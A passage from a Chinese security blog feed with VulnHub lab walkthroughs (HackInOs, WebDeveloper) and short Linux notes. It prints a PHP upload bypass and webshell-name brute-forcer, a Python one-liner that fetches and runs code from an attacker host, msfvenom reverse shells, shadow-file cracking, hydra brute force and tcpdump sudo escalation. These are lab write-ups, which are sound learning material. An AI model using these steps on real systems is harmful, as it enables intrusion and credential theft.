exploit(unix&#x2F;ftp&#x2F;vsftpd_234_backdoor) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] 192.168.99.104:21 - Banner: 220 Welcome to Heaven!</span><br><span class="line">[*] 192.168.99.104:21 - USER: 530 Permission denied.</span><br><span class="line">[-] 192.168.99.104:21 - This server is configured for anonymous only and the backdoor code cannot be reached</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure><p>尝试匿名登陆没有成功</p><p><img src= "/img/loading.gif" data-src="/posts/e4ff8385/1576476598073.png" alt></p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p>目录遍历：</p><p><img src= "/img/loading.gif" data-src="/posts/e4ff8385/1575977787813.png" alt><br>扫描结果有两个index页面，查看其中一个发现：</p><p>发现了注释</p><p><img src= "/img/loading.gif" data-src="/posts/e4ff8385/1575977822127.png" alt></p><p>访问发现是一个登陆页面，发现这个登陆页面并不会有数据包，是个静态页面</p><p><img src= "/img/loading.gif" data-src="/posts/e4ff8385/1576476010899.png" alt></p><p>然后访问 <code>/mysite</code><br><img src= "/img/loading.gif" data-src="/posts/e4ff8385/1575977851454.png" alt></p><p>查看文件后发现<br><img src= "/img/loading.gif" data-src="/posts/e4ff8385/1575977868784.png" alt></p><p>是jsfuck编码</p><p>jsfuck解码网站 <a href="http://www.jsfuck.com/#" target="_blank" rel="noopener">http://www.jsfuck.com/#</a></p><p>也可以直接用浏览器的控制台解码</p><p>可以将其复制到浏览器的控制台：<br>然后输入：<br><img src= "/img/loading.gif" data-src="/posts/e4ff8385/1575977938119.png" alt></p><p>这样可以免去手动复制粘贴的麻烦</p><p>得到结果：<br><img src= "/img/loading.gif" data-src="/posts/e4ff8385/1575977956725.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You&#39;re smart enough to understand me. Here&#39;s your secret, TryToGuessThisNorris@2k19</span><br></pre></td></tr></table></figure><p>得到了secret，猜测是ssh登陆的口令</p><h2 id="2049端口"><a href="#2049端口" class="headerlink" title="2049端口"></a>2049端口</h2><p>开放了NFS服务</p><p>使用nmap或者metasploit探测可以挂载的目录，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner&#x2F;nfs&#x2F;nfsmount) &gt; exploit </span><br><span class="line"></span><br><span class="line">[+] 192.168.99.104:111    - 192.168.99.104 NFS Export: &#x2F;home&#x2F;morris [*]</span><br><span class="line">[*] 192.168.99.104:111    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure><p>获得挂载目录 <code>/home/morris</code></p><p>安装nfspysh:</p><p><code>git clone https://github.com/bonsaiviking/NfSpy.git</code></p><h2 id="ssh服务"><a href="#ssh服务" class="headerlink" title="ssh服务"></a>ssh服务</h2><p>nmap没有扫除ssh开放的端口，因为这台靶机的ssh并不是开放在通常的22号端口上</p><p>通过扫描确认：<br><img src= "/img/loading.gif" data-src="/posts/e4ff8385/1576476969297.png" alt></p><p>ssh开放的端口是7822</p><p>尝试用之前得到的口令去登陆，用户名是<code>morris</code><br>登陆失败</p><p>从80端口的<code>index.html</code>知道，M和N的命名规则，尝试修改用户名为<code>norris</code><br><img src= "/img/loading.gif" data-src="/posts/e4ff8385/1576477106793.png" alt></p><p>登陆成功！<br>得到<code>user.txt</code>的内容</p><p><img src= "/img/loading.gif" data-src="/posts/e4ff8385/1576477362762.png" alt><br>之后去<code>/var/www/html</code>目录下查看文件</p><p>发现了<code>.secretfile.swp</code>文件<br>直接查看提示权限不够，于是想到从网页下载</p><p>可以看到<code>.secretfile.swp</code>文件的权限被设置为只有<code>www-data</code>用户才能读写</p><p><img src= "/img/loading.gif" data-src="/posts/e4ff8385/1576479512154.png" alt></p><p>通过<code>vim -r secretfile.swp</code>得到源文件内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">I see you&#39;re here for the password. Holy Moly! Battery is dying !! Mentioning below for reference..</span><br><span class="line"></span><br><span class="line">blehguessme090</span><br></pre></td></tr></table></figure><p>于是成功登陆morris用户<br><img src= "/img/loading.gif" data-src="/posts/e4ff8385/1576477489908-1581332150635.png" alt></p><h2 id="最后的“提权”"><a href="#最后的“提权”" class="headerlink" title="最后的“提权”"></a>最后的“提权”</h2><p>登陆了morris用户之后，还是无法进入到root的目录下查看文件</p><p>先上一个<code>LinEnum.sh</code>提权辅助脚本，但是并未发现有意思的东西</p><p>又去找到了另外一个脚本 <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh" target="_blank" rel="noopener">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh</a></p><p>功能比较全面，并且发现了这个：<br><img src= "/img/loading.gif" data-src="/posts/e4ff8385/1577460701158.png" alt><br>查阅文档发现了这个，类似SUID<br><img src= "/img/loading.gif" data-src="/posts/e4ff8385/1577460729799.png" alt></p><p>那么尝试用tar去打包root目录下的文件<br><img src= "/img/loading.gif" data-src="/posts/e4ff8385/1577460784686.png" alt><br>打包失败，原来这个命令应该在<code>norris</code>用户下执行</p><p>于是将root目录下的文件打包<br><img src= "/img/loading.gif" data-src="/posts/e4ff8385/1576477730035.png" alt></p><p>解压之后得到flag<br><img src= "/img/loading.gif" data-src="/posts/e4ff8385/1576477748712.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://medium.com/@barrymalone/vulnhub-vulnhub" target="_blank" rel="noopener">https://medium.com/@barrymalone/vulnhub-vulnhub</a><br><a href="https://medium.com/@alshawwa/vulnhub" target="_blank" rel="noopener">https://medium.com/@alshawwa/vulnhub</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶机渗透-HackInOs</title>
      <link href="/posts/fcea4f6a/"/>
      <url>/posts/fcea4f6a/</url>
      
        <content type="html"><![CDATA[<h1 id="HackInOs-有内网"><a href="#HackInOs-有内网" class="headerlink" title="HackInOs(有内网)"></a>HackInOs(有内网)</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>靶机IP 192.168.99.100<br>kali IP 192.168.99.101</p><p>nmap扫描结果</p><p><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1576559471820.png" alt></p><p>存在上传点但是无法上传文件</p><p><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1576559561592.png" alt></p><p>Burp抓包发现页面源代码有注释<br><a href="https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php" target="_blank" rel="noopener">https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php</a></p><p>看到提示</p><p>看到其只使用了<code>getimagesize</code>函数进行检验<br>通过加添GIF89a可以绕过上传</p><p>而文件的名字是这么产生的<br><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1576560249639.png" alt></p><p>于是上传一个一句话木马，然后对目录进行爆破即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">import hashlib</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">base_url &#x3D; &quot;http:&#x2F;&#x2F;192.168.99.100:8000&#x2F;uploads&#x2F;&quot;</span><br><span class="line">target &#x3D; []</span><br><span class="line">for i in range(101):</span><br><span class="line">    shell &#x3D; &#39;shell.php&#39; + str(i) </span><br><span class="line">    shell_md5 &#x3D; hashlib.md5(shell.encode(&#39;utf-8&#39;)).hexdigest()</span><br><span class="line">    target.append(base_url + shell_md5 + &#39;.php&#39;)</span><br><span class="line"></span><br><span class="line">for t in target:</span><br><span class="line">    r &#x3D; requests.get(t)</span><br><span class="line">    if r.status_code &#x3D;&#x3D; 200:</span><br><span class="line">        print(&quot;find it!&quot;)</span><br><span class="line">        print(t)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><p>之后使用蚁剑成功连接<br><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1576560324056.png" alt></p><p>但是发现上传不久之后shell就被删掉了</p><p>所以需要将shell移动到html目录下，(考验手速的时候到了)</p><p><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1576560733771.png" alt><br>此时成功得到shell，开始提权</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查找SUID的程序</p><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p><p><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1576561228491.png" alt></p><p>使用tail命令查看<code>/etc/shadow</code></p><p>将root用户复制过来，使用john进行爆破</p><p><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1576561315061.png" alt></p><p>得到root账号的密码是john</p><p><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1576561335215.png" alt></p><p>之后切换到root用户查看flag，但是并没有结束</p><p>运行提权辅助脚本</p><p><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1576561435933.png" alt></p><p>注意到提权辅助脚本提示有docker<br><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1576561476445.png" alt></p><p>查看IP<br><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1576561501817.png" alt></p><p>看这个IP地址很像是docker中的地址</p><p>尝试直接用root账户及其密码john进行连接，失败</p><p>大概猜到了我只是拿到了一台docker容器的权限，并没有进入到主机</p><h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><p>反弹的shell功能还是弱了，想办法得到一个<code>meterpreter</code></p><p>这里有记录一下通过shell拿到<code>meterpreter</code>的几种办法</p><h3 id="web-delivery脚本"><a href="#web-delivery脚本" class="headerlink" title="web_delivery脚本"></a>web_delivery脚本</h3><p>使用<code>exploit/multi/script/web_delivery</code> </p><p>设置好相关参数</p><p><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1576562272920.png" alt></p><p>在反弹的shell中运行这段payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import sys;u&#x3D;__import__(&#39;urllib&#39;+&#123;2:&#39;&#39;,3:&#39;.request&#39;&#125;[sys.version_info[0]],fromlist&#x3D;(&#39;urlopen&#39;,));r&#x3D;u.urlopen(&#39;http:&#x2F;&#x2F;192.168.99.101:8080&#x2F;1PrsFQbkzsmuk5&#39;);exec(r.read());&quot;</span><br></pre></td></tr></table></figure><p>得到<code>meterpreter</code>之后输入<code>background</code>让其挂起</p><h3 id="使用msfenvom生成木马"><a href="#使用msfenvom生成木马" class="headerlink" title="使用msfenvom生成木马"></a>使用msfenvom生成木马</h3><p>使用<code>exploit/multi/handler</code> 这个exploit模块</p><p>加载<code>linux/x86/meterpreter_reverse_tcp</code> 这个payload，同时通过<code>msfvenom</code> 去生成一个木马</p><p><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1577094332538.png" alt><br><code>msfvenom</code>生成木马</p><p><code>msfvenom -p linux/x86/meterpreter_reverse_tcp lhost=192.168.99.102 lport=4444 -f elf -o shell</code></p><p><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1577094345676.png" alt></p><p>蚁剑上传<br><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1577094459850.png" alt><br>执行</p><p><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1577094504865.png" alt></p><p>反弹得到<code>meterpreter</code></p><p><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1577094525517.png" alt></p><p>得到子网信息<br><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1577094592386.png" alt></p><p>之后通过metasploit之后添加一条路由<br><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1576562463870.png" alt></p><p>此时就可以看到添加的路由信息了</p><p><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1576581218733.png" alt></p><p>路由添加也可以通过：<code>rout add 172.18.0.0 255.255.0.0 1</code></p><p>指定了网段和子网掩码，以及对应的session<br><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1577094657843.png" alt></p><p>这之后我们就可以在<code>metasploit</code>中访问内网的地址了，先进行主机发现</p><p><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1576562503028.png" alt></p><p>发现了四台主机</p><p>进行后续的端口扫描<br><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1576562587710.png" alt><br>(由于扫描速度比较慢，参数调整了一下)</p><p><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1576581339308.png" alt></p><p>这里也尝试通过<code>proxychain</code>去进行扫描</p><h3 id="proxychain的配置"><a href="#proxychain的配置" class="headerlink" title="proxychain的配置"></a>proxychain的配置</h3><p><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1577095583741.png" alt></p><p>使用socks4a代理，修改<code>/etc/proxychains.conf</code>文件，</p><p><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1577095622289.png" alt><br> 取消注释同时在最后一行加上<code>127.0.0.1 1080</code><br>由于<code>proxyresolv</code>的位置有点问题，cp过来</p><p> <code>cp /usr/lib/proxychains3/proxyresolv /usr/bin/</code></p><p>之后可以通过<code>proxychains nmap -A -T4 172.18.0.2</code>启动nmap扫描，但是扫描的结果有问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# proxyresolv 172.18.0.3</span><br><span class="line">|S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-4.2.2.2:53-&lt;&gt;&lt;&gt;-OK</span><br><span class="line">172.18.0.3</span><br></pre></td></tr></table></figure><p>能够正常解析但是还是存在问题</p><p>172.18.0.2 开放了3306端口数据库，进行连接</p><p><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1576563049227.png" alt></p><p>此处也可以通过<code>portfwd add -l 8123 -r 172.18.0.3 -p 3306</code>端口转发到本地进行连接</p><p><code>mysql -h 127.0.0.1  -P 8123 -uwordpress -pwordpress</code><br><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1577094918289.png" alt></p><p>查看数据<br><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1576563178481.png" alt></p><p><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1576563190812.png" alt></p><p>解密之后得到123456<br><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1576563163280.png" alt></p><p>于是尝试直接使用该用户登陆主机</p><p>该用户在docker组中，可以尝试通过docker提权</p><p><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1576581408046.png" alt></p><p>运行的docker镜像<br><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1576581491492.png" alt></p><p>docker挂载即可<br><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1577096085570.png" alt></p><p>得到flag<br><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1576581453268.png" alt></p><p>另外一种方式提权</p><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p><p>查找SUID用户运行的程序<br><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1576581556847.png" alt></p><p>发现a.out</p><p><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1576581569529.png" alt><br>猜测其运行的是whoami命令</p><p>通过环境变量提权<br><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1576581656579.png" alt></p><p>同样拿到flag<br><img src= "/img/loading.gif" data-src="/posts/fcea4f6a/1576581679658.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一个Linux命令-kill</title>
      <link href="/posts/da023d5c/"/>
      <url>/posts/da023d5c/</url>
      
        <content type="html"><![CDATA[<h2 id="ps命令"><a href="#ps命令" class="headerlink" title="ps命令"></a>ps命令</h2><p>首先需要熟悉一下 ps 命令</p><p>一般通过 <code>ps aux | more</code> 查看到所有的进程</p><p><code>ps -e</code> 列出程序时，显示每个程序所使用的环境变量</p><p><code>ps u</code> 　 以用户为主的格式来显示程序状况。</p><p><code>ps -a</code>显示同一终端下的所有程序</p><p><code>ps a</code> 显示所有进程</p><h2 id="kill-命令"><a href="#kill-命令" class="headerlink" title="kill 命令"></a>kill 命令</h2>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> kill </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux命令trick</title>
      <link href="/posts/ebe7281d/"/>
      <url>/posts/ebe7281d/</url>
      
        <content type="html"><![CDATA[<h2 id="常用的命令组合"><a href="#常用的命令组合" class="headerlink" title="常用的命令组合"></a>常用的命令组合</h2><p><strong>统计字符串长度</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> -n 12345 | wc -c</span><br><span class="line">5</span><br></pre></td></tr></table></figure><h2 id="搜索文件后门"><a href="#搜索文件后门" class="headerlink" title="搜索文件后门"></a>搜索文件后门</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 简单的查找后门</span></span><br><span class="line">find . -name <span class="string">'*.php'</span> | xargs grep -n <span class="string">'eval('</span></span><br><span class="line">find . -name <span class="string">'*.php'</span> | xargs grep -n <span class="string">'assert('</span></span><br><span class="line">find . -name <span class="string">'*.php'</span> | xargs grep -n <span class="string">'system('</span></span><br></pre></td></tr></table></figure><h2 id="数据库备份-mysqldump用法"><a href="#数据库备份-mysqldump用法" class="headerlink" title="数据库备份 mysqldump用法"></a>数据库备份 mysqldump用法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u db_user -p db_passwd db_name &gt; bak.sql//备份指定数据库</span><br><span class="line">mysqldump --all-databases &gt; bak.sql //备份所有数据库</span><br><span class="line"></span><br><span class="line">mysql -u db_user -p db_passwd db_name &lt; bak.sql //还原指定数据库</span><br><span class="line">//也可以登录到mysql之后再 <span class="built_in">source</span> xxx.sql</span><br></pre></td></tr></table></figure><h2 id="mysql-修改密码"><a href="#mysql-修改密码" class="headerlink" title="mysql 修改密码"></a>mysql 修改密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; set password for root@localhost &#x3D; password(&#39;root&#39;);</span><br><span class="line">Query OK, 0 rows affected, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure><p>但是这条命令似乎不行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update user set password&#x3D;PASSWORD(&#39;NEW PASSWORD&#39;) where user&#x3D;&#39;root&#39;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶机渗透-WebDeveloper</title>
      <link href="/posts/4d0603d0/"/>
      <url>/posts/4d0603d0/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描端口发现是 80 和 22开放了，其中80运行着wordpress服务</p><p>使用 <code>wpscan</code> 扫描用户和插件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.99.100&#x2F; -e u,p</span><br></pre></td></tr></table></figure><p>发现了用户 <code>webdeveloper</code></p><p>之后自然是尝试爆破密码了，使用 <code>wpscan</code> 和 <code>hydra</code> 同时爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http:&#x2F;&#x2F;192.168.99.100&#x2F; -U webdeveloper  -P .&#x2F;rockyou.txt</span><br><span class="line"></span><br><span class="line">hydra -l webdeveloper -P rockyou.txt  -t 10 192.168.99.100 http-post-form &quot;&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^:login_error&quot;</span><br></pre></td></tr></table></figure><p>但是经过很长时间后并没有爆破出来，神器 <code>xray</code> 扫描也未探测到相关信息</p><p>也尝试使用了 <code>dirsearch.py</code> ，但是依旧无果</p><p>换用了 <code>dirb</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GENERATED WORDS: 4613                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.99.100&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.99.100&#x2F;index.php (CODE:301|SIZE:0)                                                                                                         </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.99.100&#x2F;ipdata&#x2F;   !!!                                                                                                             </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.99.100&#x2F;server-status (CODE:403|SIZE:302)                                                                                                   </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.99.100&#x2F;wp-admin&#x2F;                                                                                                              </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.99.100&#x2F;wp-content&#x2F;                                                                                                            </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.99.100&#x2F;wp-includes&#x2F;                                                                                                           </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.99.100&#x2F;xmlrpc.php (CODE:405|SIZE:42)</span><br></pre></td></tr></table></figure><p>发现了 <code>ipdata/</code> 目录，访问之后是一个流量包</p><p>打开之后过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method &#x3D;&#x3D; &quot;POST&quot;</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/posts/4d0603d0/1580996926610.png" alt></p><p>原来密码这么复杂。怪不得爆破不出来</p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>登录后台之后发现安装了两个插件，并且可以修改源代码，这时候就会想到用 <code>msfvenom</code> 生成php木马，然后反弹得到shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.99.1 lport&#x3D;4444 -f raw -o shell.php</span><br></pre></td></tr></table></figure><p>修改一个插件的源码然后启用就能拿到shell了</p><p>然后查看 <code>wp-config.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; ** MySQL settings - You can get this info from your web host ** &#x2F;&#x2F;</span><br><span class="line">&#x2F;** The name of the database for WordPress *&#x2F;</span><br><span class="line">define(&#39;DB_NAME&#39;, &#39;wordpress&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;** MySQL database username *&#x2F;</span><br><span class="line">define(&#39;DB_USER&#39;, &#39;webdeveloper&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;** MySQL database password *&#x2F;</span><br><span class="line">define(&#39;DB_PASSWORD&#39;, &#39;MasterOfTheUniverse&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;** MySQL hostname *&#x2F;</span><br><span class="line">define(&#39;DB_HOST&#39;, &#39;localhost&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;** Database Charset to use in creating database tables. *&#x2F;</span><br><span class="line">define(&#39;DB_CHARSET&#39;, &#39;utf8mb4&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;** The Database Collate type. Don&#39;t change this if in doubt. *&#x2F;</span><br><span class="line">define(&#39;DB_COLLATE&#39;, &#39;&#39;);</span><br></pre></td></tr></table></figure><p>获得了数据库的账号和密码，那就登陆一下数据库</p><p>但是在数据库中并没有获得很多信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line">show tables;</span><br><span class="line">+-----------------------+</span><br><span class="line">| Tables_in_wordpress   |</span><br><span class="line">+-----------------------+</span><br><span class="line">| wp_commentmeta        |</span><br><span class="line">| wp_comments           |</span><br><span class="line">| wp_links              |</span><br><span class="line">| wp_options            |</span><br><span class="line">| wp_postmeta           |</span><br><span class="line">| wp_posts              |</span><br><span class="line">| wp_term_relationships |</span><br><span class="line">| wp_term_taxonomy      |</span><br><span class="line">| wp_termmeta           |</span><br><span class="line">| wp_terms              |</span><br><span class="line">| wp_usermeta           |</span><br><span class="line">| wp_users              |</span><br><span class="line">+-----------------------+</span><br><span class="line">12 rows in set (0.00 sec</span><br></pre></td></tr></table></figure><p>尝试直接ssh登陆，居然可以！</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>登录之后 ， <code>sudo -l</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">webdeveloper@webdeveloper:~$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> webdeveloper:</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> webdeveloper on webdeveloper:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User webdeveloper may run the following commands on webdeveloper:</span><br><span class="line">    (root) /usr/sbin/tcpdump</span><br></pre></td></tr></table></figure><p>那就可以用 <code>tcpdump</code> 提权了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">webdeveloper@webdeveloper:~$ touch /tmp/exploit</span><br><span class="line">webdeveloper@webdeveloper:~$ <span class="built_in">echo</span> <span class="string">"cat /root/flag.txt"</span> &gt; /tmp/exploit</span><br><span class="line">webdeveloper@webdeveloper:~$ chmod +x /tmp/exploit</span><br><span class="line">webdeveloper@webdeveloper:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exploit -Z root</span><br><span class="line">[sudo] password <span class="keyword">for</span> webdeveloper:</span><br><span class="line">dropped privs to root</span><br><span class="line">tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">Maximum file <span class="built_in">limit</span> reached: 1</span><br><span class="line">1 packet captured</span><br><span class="line">710 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br><span class="line">webdeveloper@webdeveloper:~$ Congratulations here is youre flag:</span><br><span class="line">cba045a5a4f26f1cd8d7be9a5c2b1b34f6c5d290</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一个Linux命令-tcpdump</title>
